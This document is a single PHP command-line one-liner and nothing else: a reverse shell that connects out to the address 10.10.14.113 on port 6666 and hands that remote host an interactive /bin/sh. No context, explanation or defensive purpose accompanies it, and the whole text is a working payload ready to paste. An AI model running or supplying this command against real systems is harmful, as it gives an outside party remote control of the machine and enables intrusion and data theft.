php -r '$sock=fsockopen("10.10.14.113",6666);exec("/bin/sh -i <&3 >&3 2>&3");'
